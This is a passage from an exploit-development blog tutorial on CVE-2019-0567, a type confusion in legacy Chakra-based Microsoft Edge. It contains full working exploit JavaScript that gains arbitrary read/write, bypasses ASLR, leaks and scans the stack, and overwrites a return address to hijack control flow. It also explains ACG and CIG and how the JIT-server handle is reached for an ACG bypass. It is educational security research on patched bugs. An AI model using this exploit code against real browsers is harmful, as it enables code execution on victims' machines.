1. Leak the heap from `chakra!ThreadContext::globalListFirst`
2. Using the read primitive, scan the heap for any stack addresses that are greater than the leaked stack address from `stackLimitForCurrentThread`

I found that about 50-60% of the time I could reliably leak a stack address from the heap. From there, about 50% of the time the stack address that was leaked from the heap was committed to memory. However, there was a varying degree of "failing" - meaning I would often get an access violation on the leaked stack address from the heap. Although I was only succeeding in about half of the exploit attempts, this is _significantly_ greater than trying to "guess" the offset from the `stackLimitForCurrenThread`. However, after I got frustrated with this, I saw there was a much easier approach. 

The reason why I didn't take this approach earlier, is because the `stackLimitForCurrentThread` seemed to be from a thread stack which was no longer in memory. This can be seen below.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion34.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion35.png" alt="">

Looking at the above image, we can see only one active thread has a stack address that is anywhere near `stackLimitForCurrentThread`. However, if we look at the TEB for the single thread, the stack address we are leaking doesn't fall anywhere within that range. This was disheartening for me, as I assumed any stack address I leaked from this `ThreadContext` structure was from a thread which was no longer active and, thus, its stack address space being decommitted. However, in the Google Project Zero issue - `stackLimitForCurrentThread` wasn't the item leaked, it was `leafInterpreterFrame`. Since I had enjoyed success with `stackLimitForCurrentThread` in part two of this blog series, it didn't cross my mind until much later to investigate this specific member.

If we take a look at the `ThreadContext` structure, we can see that at offset `0x8f0` that there is a stack address.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion36.png" alt="">

In fact, we can see _two_ stack addresses. Both of them are committed to memory, as well!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion37.png" alt="">

If we compare this to Ivan's findings in the Project Zero issue, we can see that he leaks two stack addresses at offset `0x8a0` and `0x8a8`, just like we have leaked them at `0x8f0` and `0x8f8`. We can therefore infer that these are the same stack addresses from the `leafInterpreter` member of `ThreadContext`, and that we are likely on a different version of Windows that Ivan, which likely means a different version of Edge and, thus, the slight difference in offset. For our exploit, you can choose either of these addresses. I opted for `ThreadContext + 0x8f8`.

Additionally, if we look at the address itself (`0x1c2affaf60`), we can see that this address doesn't reside within the current thread.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion38.png" alt="">

However, we can clearly see that not only is this thread committed to memory, it is within the known bounds of _another_ thread's TEB tracking of the stack (note that the below diagram is confusing because the columns are unaligned. We are outlining the stack base and limit).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion39.png" alt="">

This means we can reliably locate a stack address for a currently executing thread! It is perfectly okay if we end up hijacking a return address within _another_ thread because as we have the ability to read/write anywhere within the process space, and because the level of "private" address space Windows uses is on a per-process basis, we can still hijack any thread from the current process. In essence, it is perfectly valid to corrupt a return address on _another_ thread to gain code execution. The "lower level details" are abstracted away from us when it comes to this concept, because _regardless_ of what return address we overwrite, or when the thread terminates, it will have to return control-flow somewhere in memory. Since threads are constantly executing functions, we know that at some point the thread we are dealing with will receive priority for execution and the return address will be executed. If this makes no sense, do not worry. Our concept hasn't changed in terms of overwriting a return address (be it in the current thread or another thread). We are not changing anything, from a foundational perspective, in terms of our stack leak and return address corruption between this blog post and part two of this blog series.

With that being said, here is how our exploit now looks with our stack leak.

```html
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    // Store the base of chakra.dll
    chakraLo = vtableLo - 0x5d0bf8;
    chakraHigh = vtableHigh;

    // Print update
    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");

    // Leak a pointer to kernelbase.dll (KERNELBASE!DuplicateHandle) from the IAT of chakra.dll
    // chakra+0x5ee2b8 points to KERNELBASE!DuplicateHandle
    kernelbaseLeak = read64(chakraLo+0x5ee2b8, chakraHigh);

    // KERNELBASE!DuplicateHandle is 0x18de0 away from kernelbase.dll's base address
    kernelbaseLo = kernelbaseLeak[0]-0x18de0;
    kernelbaseHigh = kernelbaseLeak[1];

    // Store the pointer to KERNELBASE!DuplicateHandle (needed for our ACG bypass) into a more aptly named variable
    var duplicateHandle = new Uint32Array(0x4);
    duplicateHandle[0] = kernelbaseLeak[0];
    duplicateHandle[1] = kernelbaseLeak[1];

    // Print update
    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbaseHigh) + hex(kernelbaseLo));
    document.write("<br>");

    // Print update with our type pointer
    document.write("[+] type pointer: 0x" + hex(typeHigh) + hex(typeLo));
    document.write("<br>");

    // Arbitrary read to get the javascriptLibrary pointer (offset of 0x8 from type)
    javascriptLibrary = read64(typeLo+8, typeHigh);

    // Arbitrary read to get the scriptContext pointer (offset 0x450 from javascriptLibrary. Found this manually)
    scriptContext = read64(javascriptLibrary[0]+0x430, javascriptLibrary[1])

    // Arbitrary read to get the threadContext pointer (offset 0x3b8)
    threadContext = read64(scriptContext[0]+0x5c0, scriptContext[1]);

    // Leak a pointer to a pointer on the stack from threadContext at offset 0x8f0
    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1360
    // Offsets are slightly different (0x8f0 and 0x8f8 to leak stack addresses)
    stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);

    // Print update
    document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
    document.write("<br>");
}
</script>
```

After running our exploit, we can see that we have successfully leaked a stack address.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion40.png" alt="">

From our experimenting earlier, the offsets between the leaked stack addresses have a certain degree of variance between script runs. Because of this, there is no way for us to compute the base and limit of the stack with our leaked address, as the offset is set to change. Because of this, we will forgo the process of computing the stack limit. Instead, we will perform our stack scanning for return addresses from the address we have currently leaked. Let's recall a previous image outlining the stack limit of the thread where we leaked a stack address at the time of the leak.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion39.png" alt="">

As we can see, we are towards the base of the stack. Since the stack grows "downwards", as we can see with the stack base being located at a higher address than the actual stack limit, we will do our scanning in "reverse" order, in comparison to part two. For our purposes, we will do stack scanning by starting at our leaked stack address and traversing _backwards_ towards the stack limit (which is the highest, technically "lowest" address the stack can grow towards).

We already outlined in part two of this blog post the methodology I used in terms of leaking a return address to corrupt. As mentioned then, the process is as follows:

1. Traverse the stack using read primitive
2. Print out all contents of the stack that are possible to read
3. Look for anything starting with `0x7fff`, meaning an address from a loaded module like `chakra.dll`
4. Disassemble the address to see if it is an actual return address

While omitting much of the code from our full exploit, a stack scan would look like this (a scan used just to print out return addresses):

```javascript
(...)truncated(...)

// Leak a pointer to a pointer on the stack from threadContext at offset 0x8f0
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1360
// Offsets are slightly different (0x8f0 and 0x8f8 to leak stack addresses)
stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);

// Print update
document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
document.write("<br>");

// Counter variable
let counter = 0x6000;

// Loop
while (counter != 0)
{
    // Store the contents of the stack
    tempContents = read64(stackleakPointer[0]+counter, stackleakPointer[1]);

    // Print update
    document.write("[+] Stack address 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]+counter) + " contains: 0x" + hex(tempContents[1]) + hex(tempContents[0]));
    document.write("<br>");

    // Decrement the counter
    // This is because the leaked stack address is near the stack base so we need to traverse backwards towards the stack limit
    counter -= 0x8;
}
````

As we can see above, we do this in "reverse" order of our ChakraCore exploit in part two. Since we don't have the luxury of already knowing where the stack limit is, which is the "last" address that can be used by that thread's stack, we can't just traverse the stack by incrementing. Instead, since we are leaking an address towards the "base" of the stack, we have to decrement (since the stack grows downwards) towards the stack limit.

In other words, less technically, we have leaked somewhere towards the "bottom" of the stack and we want to walk towards the "top of the stack" in order to scan for return addresses. You'll notice a few things about the previous code, the first being the arbitrary `0x6000` number. This number was found by trial and error. I started with `0x1000` and ran the loop to see if the exploit crashed. I kept incrementing the number until a crash started to ensue. A crash in this case refers to the fact we are likely reading from decommitted memory, meaning we will cause an access violation. The "gist" of this is to basically see how many bytes you can read without crashing, and those are the return addresses you can choose from. Here is how our output looks.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion41.png" alt="">

As we start to scroll down through the output, we can clearly see some return address starting to bubble up!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion42.png" alt="">

Since I already mentioned the "trial and error" approach in part two, which consists of overwriting a return address (after confirming it is one) and seeing if you end up controlling the instruction pointer by corrupting it, I won't show this process here again. Just know, as mentioned, that this is just a matter of trial and error (in terms of my approach). The return address that I found worked best for me was `chakra!Js::JavascriptFunction::CallFunction<1>+0x83` (again there is no "special" way to find it. I just started corrupting return address with `0x4141414141414141` and seeing if I caused an access violation with RIP being controlled to by the value `0x4141414141414141`, or RSP being pointed to by this value at the time of the access violation).

This value can be seen in the stack leaking contents.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion43.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion44.png" alt="">

Why did I choose this return address? Again, it was an arduous process taking every stack address and overwriting it until one consistently worked. Additionally, a little less anecdotally, the symbol for this return address is with a function quite literally called `CallFunction`, which means its likely responsible for executing a function call of interpreted JavaScript. Because of this, we know a function will execute its code and then hand execution back to the caller via the return address. It is likely that this piece of code will be executed (the return address) since it is responsible for calling a function. However, there are many other options that you could choose from.  

```html
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    // Store the base of chakra.dll
    chakraLo = vtableLo - 0x5d0bf8;
    chakraHigh = vtableHigh;

    // Print update
    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");

    // Leak a pointer to kernelbase.dll (KERNELBASE!DuplicateHandle) from the IAT of chakra.dll
    // chakra+0x5ee2b8 points to KERNELBASE!DuplicateHandle
    kernelbaseLeak = read64(chakraLo+0x5ee2b8, chakraHigh);

    // KERNELBASE!DuplicateHandle is 0x18de0 away from kernelbase.dll's base address
    kernelbaseLo = kernelbaseLeak[0]-0x18de0;
    kernelbaseHigh = kernelbaseLeak[1];

    // Store the pointer to KERNELBASE!DuplicateHandle (needed for our ACG bypass) into a more aptly named variable
    var duplicateHandle = new Uint32Array(0x4);
    duplicateHandle[0] = kernelbaseLeak[0];
    duplicateHandle[1] = kernelbaseLeak[1];

    // Print update
    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbaseHigh) + hex(kernelbaseLo));
    document.write("<br>");

    // Print update with our type pointer
    document.write("[+] type pointer: 0x" + hex(typeHigh) + hex(typeLo));
    document.write("<br>");

    // Arbitrary read to get the javascriptLibrary pointer (offset of 0x8 from type)
    javascriptLibrary = read64(typeLo+8, typeHigh);

    // Arbitrary read to get the scriptContext pointer (offset 0x450 from javascriptLibrary. Found this manually)
    scriptContext = read64(javascriptLibrary[0]+0x430, javascriptLibrary[1])

    // Arbitrary read to get the threadContext pointer (offset 0x3b8)
    threadContext = read64(scriptContext[0]+0x5c0, scriptContext[1]);

    // Leak a pointer to a pointer on the stack from threadContext at offset 0x8f0
    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1360
    // Offsets are slightly different (0x8f0 and 0x8f8 to leak stack addresses)
    stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);

    // Print update
    document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
    document.write("<br>");

    // We can reliably traverse the stack 0x6000 bytes
    // Scan the stack for the return address below
    /*
    0:020> u chakra+0xd4a73
    chakra!Js::JavascriptFunction::CallFunction<1>+0x83:
    00007fff`3a454a73 488b5c2478      mov     rbx,qword ptr [rsp+78h]
    00007fff`3a454a78 4883c440        add     rsp,40h
    00007fff`3a454a7c 5f              pop     rdi
    00007fff`3a454a7d 5e              pop     rsi
    00007fff`3a454a7e 5d              pop     rbp
    00007fff`3a454a7f c3              ret
    */

    // Creating an array to store the return address because read64() returns an array of 2 32-bit values
    var returnAddress = new Uint32Array(0x4);
    returnAddress[0] = chakraLo + 0xd4a73;
    returnAddress[1] = chakraHigh;

	// Counter variable
	let counter = 0x6000;

	// Loop
	while (counter != 0)
	{
	    // Store the contents of the stack
	    tempContents = read64(stackleakPointer[0]+counter, stackleakPointer[1]);

	    // Did we find our target return address?
        if ((tempContents[0] == returnAddress[0]) && (tempContents[1] == returnAddress[1]))
        {
			document.write("[+] Found our return address on the stack!");
            document.write("<br>");
            document.write("[+] Target stack address: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]+counter));
            document.write("<br>");

            // Break the loop
            break;

        }
        else
        {
        	// Decrement the counter
	    	// This is because the leaked stack address is near the stack base so we need to traverse backwards towards the stack limit
	    	counter -= 0x8;
        }
	}

	// Corrupt the return address to control RIP with 0x4141414141414141
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);
}
</script>
```

Open the updated `exploit.html` script and attach WinDbg _before_ pressing the `Click me to exploit CVE-2019-0567!` button.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion3.png" alt="">

After attaching to WinDbg and pressing `g`, go ahead and click the button (may require clicking twice in some instance to detonate the exploit). Please note that sometimes there is a _slight_ edge case where the return address isn't located on the stack. So if the debugger shows you crashing on the `GetValue` method, this is likely a case of that. After testing, 10/10 times I found the return address. However, it is possible once in a while to not encounter it. It is very rare.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion45.png" alt="">

After running `exploit.html` in the debugger, we can clearly see that we have overwritten a return address on the stack with `0x4141414141414141` and Edge is attempting to return into it. We have, again, successfully corrupted control-flow and can now redirect execution wherever we want in Edge. We went over all of this, as well, in part two of this blog series!

Now that we have our read/write primitive and control-flow hijacking ported to Edge, we can now begin our Edge-specific exploitation which involves many ROP chains to bypass Edge mitigations like Arbitrary Code Guard.

Arbitrary Code Guard && Code Integrity Guard
---
We are now at a point where our exploit has the ability to read/write memory, we control the instruction pointer, and we know where the stack is. With these primitives, exploitation should be as follows (in terms of where exploit development currently and traditionally is at):

1. Bypass ASLR to determine memory layout (done)
2. Achieve read/write primitive (done)
3. Locate the stack (done)
4. Control the instruction pointer (done)
5. Write a ROP payload to the stack (TBD)
6. Write shellcode to the stack (or somewhere else in memory) (TBD)
7. Mark the stack (or regions where shellcode is) as RWX (TBD)
8. Execute shellcode (TBD)

Steps 5 through 8 are required as a result of DEP. DEP, a mitigation which has been beaten to death, separates code and data segments of memory. The stack, being a data segment of memory (it is only there to hold data), is _not_ executable whenever DEP is enabled. Because of this, we invoke a function like `VirtualProtect` (via ROP) to mark the region of memory we wrote our shellcode to (which is a data segment that allows data to be _written_ to it) as RWX. I have documented this procedure [time](https://connormcgarr.github.io/ROP2/) and [time](https://connormcgarr.github.io/ROP/) again. We leak an address (or abuse non-ASLR modules, which is very rare now), we use our primitive to write to the stack (stack-based buffer overflow in the two previous links provided), we mark the stack as RWX via ROP (the shellcode is also on the stack) and we are now allowed to execute our shellcode since its in a RWX region of memory. With that said, let me introduce a new mitigation into the fold - Arbitrary Code Guard (ACG).

ACG is a mitigation which prohibits _any_ dynamically-generated RWX memory. This is manifested in a few ways, pointed out by [Matt Miller](https://twitter.com/epakskape) in his [blog post](https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/) on ACG. As Matt points out:

> "With ACG enabled, the Windows kernel prevents a content process from creating and modifying code pages in memory by enforcing the following policy:
> 
> 1. Code pages are immutable. Existing code pages cannot be made writable and therefore always have their intended content. This is enforced with additional checks in the memory manager that prevent code pages from becoming writable or otherwise being modified by the process itself. For example, it is no longer possible to use `VirtualProtect` to make an image code page become `PAGE_EXECUTE_READWRITE`.
> 
> 2. New, unsigned code pages cannot be created. For example, it is no longer possible to use `VirtualAlloc` to create a new `PAGE_EXECUTE_READWRITE` code page."

What this means is that an attacker can write their shellcode to a data portion of memory (like the stack) all they want, gladly. However, the permissions needed (e.g. the memory must be explicitly marked executable by the adversary) can _never_ be achieved with ACG enabled. At a high level, no memory permissions in Edge (specifically content processes, where our exploit lives) can be modified (we can't write our shellcode to a code page nor can we modify a data page to execute our shellcode).

Now, you may be thinking - "Connor, instead of executing native shellcode in this manner, why don't you just use `WinExec` like in your previous exploit from part two of this blog series to spawn `cmd.exe` or some other application to download some staged DLL and just load it into the process space?" This is a perfectly valid thought - and, thus, has already been addressed by Microsoft.

Edge has _another_ small mitigation known as "no child processes". This nukes any ability to spawn a child process to go inject some shellcode into another process, or load a DLL. Not only that, even if there was no mitigation for child processes, there is a "sister" mitigation to ACG called Code Integrity Guard (CIG) which also is present in Edge.

CIG essentially says that only Microsoft-signed DLLs can be loaded into the process space. So, even if we could reach out to a retrieve a staged DLL and get it onto the system, it isn't possible for us to load it into the content process, as the DLL isn't a signed DLL (inferring the DLL is a malicious one, it wouldn't be signed). 

So, to summarize, in Edge we cannot:
1. Use `VirtualProtect` to mark the stack where our shellcode is to RWX in order to execute it
2. We can't use `VirtualProtect` to make a code page (RX memory) to writable in order to write our shellcode to this region of memory (using something like a `WriteProcessMemory` ROP chain)
3. We cannot allocate RWX memory within the current process space using `VirtualAlloc`
4. We cannot allocate RW memory with `VirtualAlloc` and then mark it as RX
5. We cannot allocate RX memory with `VirtualAlloc` and then mark it as RW

With the advent of all three of these mitigations, previous exploitation strategies are all thrown out of the window. Let's talk about how this changes our exploit strategy, now knowing we cannot just execute shellcode directly within the content process.

CVE-2017-8637 - Combining Vulnerabilities
---
As we hinted at, and briefly touched on earlier in this blog post, we know that something has to be done about JIT code with ACG enablement. This is because, by default, JIT code is generated as RWX. If we think about it, JIT'd code first starts out as an "empty" allocation (just like when we allocate some memory with `VirtualAlloc`). This memory is first marked as RW (it is writable because Chakra needs to actually write the code into it that will be executed into the allocation). We know that since there is no execute permission on this RW allocation, and this allocation has code that needs to be executed, the JIT engine has to change the region of memory to RX _after_ its generated. This means the JIT engine has to generate dynamic code that has its memory permissions changed. Because of this, no JIT code can really be generated in an Edge process with ACG enabled. As pointed out in Matt's blog post (and briefly mentioned by us) this architectural issue was addresses as follows:

> "Modern web browsers achieve great performance by transforming JavaScript and other higher-level languages into native code. As a result, they inherently rely on the ability to generate some amount of unsigned native code in a content process. Enabling JIT compilers to work with ACG enabled is a non-trivial engineering task, but it is an investment that we’ve made for Microsoft Edge in the Windows 10 Creators Update. To support this, we moved the JIT functionality of Chakra into a separate process that runs in its own isolated sandbox. The JIT process is responsible for compiling JavaScript to native code and mapping it into the requesting content process. In this way, the content process itself is never allowed to directly map or modify its own JIT code pages."

As we have already seen in this blog post, two processes are generated (JIT server and content process) and the JIT server is responsible for taking the JavaScript code from the content process and transforming it into machine code. This machine code is then mapped back into the content process with appropriate permissions (like that of the `.text` section, RX). The vulnerability ([CVE-2017-8637](https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2017-8637)) mentioned in this section of the blog post took advantage of a flaw in this architecture to compromise Edge fully and, thus, bypass ACG. Let's talk about a bit about the architecture of the JIT server and content process communication channel first (please note that this vulnerability has been patched).

The last thing to note, however, is where Matt says that the JIT process was moved "...into a separate process that runs in its own isolated sandbox". Notice how Matt did not say that it was moved into an ACG-compliant process (as we know, ACG isn't compatible with JIT). Although the JIT process may be "sandboxed" it does not have ACG enabled. It does, however, have CIG _and_ "no child processes" enabled. We will be taking advantage of the fact the JIT process doesn't (and still to this day doesn't, although the new V8 version of Edge only has ACG support in a special mode) have ACG enabled. With our ACG bypass, we will leverage a vulnerability with the way Chakra-based Edge managed communications (specifically via a process handle stored within the content process) to and from the JIT server. With that said, let's move on.

Leaking The JIT Server Handle
---
The content process uses an RPC channel in order to communicate with the JIT server/process. I found this out by opening `chakra.dll` within IDA and searching for any functions which looked interesting and contained the word "JIT". I found an interesting function named `JITManager::ConnectRpcServer`. What stood out to me immediately was a call to the function `DuplicateHandle` within `JITManager::ConnectRpcServer`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion46.png" alt="">

If we look at [ChakraCore](https://github.com/chakra-core/ChakraCore/blob/1eae003b7a981b4b691928daef27b5254a49f5eb/lib/JITClient/JITManager.cpp#L236) we can see the source (which should be _close_ between Chakra and ChakraCore) for this function. What was very interesting about this function is the fact that the first argument this function accepts is seemingly a "handle to the JIT process".

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion47.png" alt="">

Since `chakra.dll` contains the functionality of the Chakra JavaScript engine and since `chakra.dll`, as we know, is loaded into the content process - this functionality is accessible through the content process (where our exploit is running). This infers at _some point_ the content process is doing _something_ with what seems to be a handle to the JIT server. However, we know that the value of `jitProcessHandle` is supplied by the caller (e.g. the function which actually invokes `JITManager::ConnectRpcServer`). Using IDA, we can look for cross-references to this function to see what function is responsible for calling `JITManager::ConnectRpcServer`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion48.png" alt="">

Taking a look at the above image, we can see the function `ScriptEngine::SetJITConnectionInfo` is responsible for calling `JITManager::ConnectRpcServer` and, thus, also for providing the JIT handle to the function. Let's look at `ScriptEngine::SetJITConnectionInfo` to see exactly how this function provides the JIT handle to `JITManager::ConnectRpcServer`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion49.png" alt="">

We know that the `__fastcall` calling convention is in use, and that the first argument of `JITManager::ConnectRpcServer` (as we saw in the ChakraCore code) is where the JIT handle goes. So, if we look at the above image, whatever is in RCX directly prior to the call to `JITManager::ConnectRpcServer` will be the JIT handle. We can see this value is gathered from a symbol called `s_jitManager`.

We know that this is the value that is going to be passed to the `JITManager::ConnectRpcServer` function in the RCX register - meaning that this symbol has to contain the handle to the JIT server. Let's look again, once more, at `JITManager::ConnectRpcServer` (this time with some additional annotation).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion50.png" alt="">

We already know that RCX = `s_jitManager` when this function is executed. Looking deeper into the disassembly (almost directly before the `DuplicateHandle` call) we can see that `s_jitManager+0x8` (a.k.a RCX at an offset of `0x8`) is loaded into R14. R14 is then used as the `lpTargetHandle` parameter for the call to `DuplicateHandle`. Let's take a look at `DuplicateHandle`'s prototype (don't worry if this is confusing, I will provide a summation of the findings very shortly to make sense of this).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion51.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion52.png" alt="">

If we take a look at the description above, the `lpTargetHandle` will "...receive the duplicate handle...". What this means is that `DuplicateHandle` is used in this case to duplicate a handle to the JIT server, and store the duplicated handle within `s_jitManager+0x8` (a.k.a the content process will have a handle to the JIT server) We can base this on two things - the first being that we have anecdotal evidence through the name of the variable we located in `ChakraCore`, which is `jitprocessHandle`. Although Chakra isn't identical to ChakraCore in _every_ regard, Chakra is following the same convention here. Instead, however, of directly supplying the `jitprocessHandle` - Chakra seems to manage this information through a structure called `s_jitManager`. The second way we can confirm this is through hard evidence. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion53.png" alt="">

If we examine `chakra!JITManager::s_jitManager+0x8` (where we have hypothesized the duplicated JIT handle will go) within WinDbg, we can clearly see that this is a handle to a process with `PROCESS_DUP_HANDLE` access. We can also use Process Hacker to examine the handles to and from `MicrosoftEdgeCP.exe`. First, run Process Hacker as _an administrator_. From there, double-click on the `MicrosoftEdgeCP.exe` content process (the one using the most RAM as we saw, PID `4172` in this case). From there, click on the `Handles` tab and then sort the handles numerically via the `Handle` tab by clicking on it until they are in ascending order.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion54.png" alt="">

If we then scroll down in this list of handles, we can see our handle of `0x314`. Looking at the `Name` column, we can also see that this is a handle to _another_ `MicrosoftEdgeCP.exe` process. Since we know there are only two (whenever `exploit.html` is spawned and no other tabs are open) instances of `MicrosoftEdgeCP.exe`, the other "content process" (as we saw earlier) must be our JIT server (PID `7392`)!

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion55.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion56.png" alt="">

